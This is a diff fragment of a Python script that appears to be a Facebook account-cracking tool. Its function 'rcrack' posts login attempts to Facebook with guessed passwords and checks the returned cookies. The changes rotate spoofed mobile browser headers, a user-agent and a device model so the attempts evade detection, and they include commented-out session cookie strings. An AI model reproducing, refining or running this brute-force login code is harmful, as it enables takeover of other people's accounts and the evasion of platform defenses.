@@ -435,23 +435,23 @@ def rcrack(uid,pwx,tl):
 			header_freefb = {
     'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=O30aZUfKWQ5yq2yh88459bfc; sb=O30aZWv54nCY0DogU90a5_L9; m_pixel_ratio=3; wd=360x560; fr=028lCpomimin9L7pT..BlGn07.6P.AAA.0.0.BlGn1R.AWUw-K8C-mk',
-    'dpr': '3',
+    # 'cookie': 'datr=_IcaZTcRC9x88ES0O5qERemj; sb=_YcaZasbcFNQG9Rp5MhH_hJN; m_pixel_ratio=2.75; wd=393x682; fr=0kfseSQHZhYplpXeP..BlGof8.00.AAA.0.0.BlGogA.AWVTw1pFf2U',
+    'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"SM-G610F"',
+    'sec-ch-ua-model': '"POCO F1"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"8.1.0"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 30 Pro 5G Build/QP1A.191105.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0 Mobile Safari/90.0.4430.210 OPR/537.36',}
 			lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 
@@ -502,4 +502,4 @@ def rcrack(uid,pwx,tl):
 
 		pass
 
-menu() à
+menu() 
